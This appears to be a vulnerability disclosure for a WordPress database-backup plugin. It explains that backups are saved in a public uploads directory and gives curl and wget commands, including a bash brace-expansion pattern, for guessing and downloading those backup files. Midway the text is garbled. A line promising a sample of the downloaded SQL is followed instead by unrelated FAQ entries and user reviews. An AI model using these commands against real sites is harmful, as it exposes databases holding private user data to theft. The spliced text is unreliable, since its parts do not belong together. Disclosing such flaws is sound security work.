This plugin stores downloads by default locally in the directory `wp-content/uploads/db-backup/` with this syntax:

```
[Site_Title]_[Date with EPOC]_[7 characters random ID]_wpdb.zip

```

This directory exposes the backup file to an unauthorized sphere of control (CWE-530) and backup files can be downloaded by unauthorized people in this way:

```
curl -O https://poc.sejalivre.org/wp-content/uploads/db-backup/My_Blog_2020_01_20_1579532189_396c2cd_wpdb.zip

```

For example, to list the files in the directory, you can use **Bash Brace Expansion** like this:

```
wget https://poc.sejalivre.org/wp-content/uploads/db-backup/My_Blog_2020_{0..1}{0..2}_{0..3}{0..9}_1579532189_396c2cd_wpdb.zip

```

Wildcard is not supported over HTTP, however you can use bash brace expansion to guess the files in the directory.

This is a piece of the sql downloaded:

### On Click Create New Database Backup it goes to blank page

if the site is very large, it takes time to create the database backup. And if the server execution time is set to low value, you get go to blank page.

### [Auto-Backups Stopped Working](https://wordpress.org/support/topic/auto-backups-stopped-working/)

[Jennifer](https://profiles.wordpress.org/ratgurrl/ "Posts by Jennifer")
October 12, 2024

Update: This magically started working again. No issues.
I am running WP 6.6.2. This used to work flawlessly, but I noticed yesterday that I have not had an (database only) auto-backup since June (the email notification also stopped working). I can do manual backups without issue, but the auto-backup feature is no longer working.
Additonally, I am not able to change the time that the backup should occur. I enter a time, hit save, but it stays at 00:00.
The plugin is intuitive, and the interface is clean and not cluttered with a bunch of product adds or requirements for additional plugins.
When it’s working properly, it’s the best!

### [FIXED – unable to create the backup – support fixed 🙏](https://wordpress.org/support/topic/fixed-unable-to-create-the-backup-support-fixed-%F0%9F%99%8F/)

The support team took full ownership of my issue and maintained regular communication over several days, keeping me informed throughout the process. They even sought assistance from GitHub to resolve the problem. Just as I was about to give up, they contacted me with the good news that it was resolved ✔️
My database had grown to 150 megabytes, which is possibly why it took a significant effort to fix. Now, I am able to back up my data effortlessly and run housekeeping tasks on the database with confidence.
thankyou guys 🙏

Excellent UI and functionality. Had trouble backing up to Google Drive, so opted for the local backup option (for destination of the entire site, include the database).

Auto-Scheduler/Enable Auto Backups is disabled and I selected monthly backups but it produces backups every 10 minutes so my hosting server could run out of capacity… I found no way to change it. Now I have to found a way to stop producing backups – wtf
